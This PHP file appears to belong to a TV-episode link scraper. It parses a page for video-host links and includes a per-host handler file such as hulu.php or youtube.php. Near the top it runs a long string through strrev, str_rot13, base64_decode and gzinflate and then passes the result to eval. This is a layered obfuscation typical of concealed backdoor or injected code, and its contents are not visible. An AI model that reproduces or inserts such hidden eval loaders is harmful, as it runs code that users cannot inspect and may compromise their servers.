<?php

$t="$show";
$s="$season";
$e="$episode";

eval(gzinflate(base64_decode(str_rot13(strrev('/pr+/+917msm4UTtbyvcKxCv+kFuMRNxoDWx+fWnu/hWa5bzviBQ+Ilyc2r2xuwQhqDAVj3vK7rt2FrtG13/MsFXu9Npf9q7216mC7UJoZ14XwQJdTRhtsg0XwYX/hMOHfLB5OnTj3BljKaNjOflmy2B4qw3cGGQ7sycxb1oicr7a3KIS0UruxIjve6LXnUMFzIFaCcA1ot0IyNIFY6EcGjg5WvZU3jOcKZYqkvj5AZFSPCFl+OoKXVwVVOojOxNrrADaEtKomAHlA4DenleoiQ0Xuw3LXGhIbEUJRg5+3fYAlM8CuqsQ5DF2h7cskuzS+JV4WfveHcPRuQDcJV3YAULz7hcgkx9hdm8tB+DRcDoHg5Jl3Pq9GPHe51eBEKWD6YjzkNeahyI+c7hNo+SL+jXK/zVpQWCJ7kbMRj+Ruf3pVng797Lerq1LIackEchcrCa4f6KRFVTZPAwL6LDyH45nkVmmYaybtMjspWHzfcopEt9/Tr/2OrrYB3uUT9qWo5kBS4R2+pu7Syti9bxKpbPu8AVxGd+1vB0kQfrIFfcRLq0Kk/pnJXTQosXys3W7dwuWuKR9KUx3vX5u6JPjToCu1PT7ioEAHiD4pmQOm+w5GPPVW19nOfIbAFkFnjTzDqkitAopjqE/0fn3jynLHpLldkMxywBXrGqngl49RcGs4DiSdaL5yqpACezIIF5ZUPa5MxNp0vd2qKIfqxU8kkajXbaQcdj8xT5YYgVWwKG5uznuT28ljahyLcVIZbmy1XIlmnUEath0Dpmp8GDv6VGNQTrAFadMVTXik5aNQykXXcnRQqy/FxZOAmH1T1871Rgh2FUFk/NAvyo/nAKG+qpQQg5IswSbM4VZUNlGwwLwrqbB/ytYW0wHJ8/Z9JStp6SaC7Cw8wM80QRbZsJ+6Jq9ezu8k8KEYY07VkC31memhZijUg02F7aIdekgcCZSDrbAzqxe2GFaczW9vHgVfGwecZ9HFdFYmgLy90JJq0Ymb1OqbOoVkmUSzUApJ9ySNytI4k5geZApjw0nN8xwLnRFABnCdJPm8EULZid4nSUM7p6otWhhhzYzDqhl646SNZItvGpZt8gOkdSu+paolXBHxJGsXmbkzSod2dzowm15VS7Ln2Ai25uDSpyt1FKqDpy7s5wxwv1igFzxWJ6nh2CZLRbzu+cZ7Y0lbbH53fhSwIBKJkWUDfhx0990S2S2UdIPP/k3rnJ4HN4QQ0aJ9x3ckZ3Nrna9KnWhcvQ4BWSZr8ZeAYB+vit6pTwUlTl22a6+6jv3jo5G78O4HruxAKbAJ7iefNrZDuJfPtb7G8AGqEKPPQnKr1gH22R2/U5jNyrpqVD0nx7KOYnVqRZZXzVJAxYMinwVoVGil1H62z4G3lUUo1JvAuuJE9ptXMxIC43rCJInRmPEYKToWW86XS2so2AEoYlyeynOSeQoYS95sdIISluhm+UeHPngllmlOgUiI4efL2NRLkR3PzlMCmgGalVj7J7d/AuchAAihzNvSimH0qFQubOSQfTC1PExnabd93lLNIiiA/65sSWUM3gOg4pWoup+/KkqpnJ+772/DWI5G5H4ebFqmlaY3gCPBmGH9i2aEc06Lxwcbfr7C9lBXaCE6UnYyLLcufYMqPVvr9ksDRNzEee3FMS')))));

require_once(dirname(__FILE__).'/class_xml.php');

$oldSetting = libxml_use_internal_errors( true );
libxml_clear_errors();
$html = new DOMDocument();
$html->loadHtmlFile( $episode );
$xpath = new DOMXPath( $html );
$links = $xpath->query( '//a' );

foreach ( $links as $link ) {

$x = $link->getAttribute( 'data-viewable-url' );

if(strstr($x,'megavideo.com'))
{
include 'mega.php';
}

if(strstr($x,'videobb.com'))
{
include 'videobb.php';
}

if(strstr($x,'vidxden.com'))
{
include 'vidxden.php';
}

if(strstr($x,'novamov.com'))
{
include 'novamov.php';
}

if(strstr($x,'cbs.com'))
{
include 'cbs.php';
}

if(strstr($x,'hulu.com'))
{
include 'hulu.php';
}

if(strstr($x,'hulu.com'))
{
include 'hulu.php';
}

if(strstr($x,'tehcake.com'))
{
include 'tehcake.php';
}

if(strstr($x,'youtube.com'))
{
include 'youtube.php';
}

}

libxml_clear_errors();
libxml_use_internal_errors( $oldSetting );
?>
<br>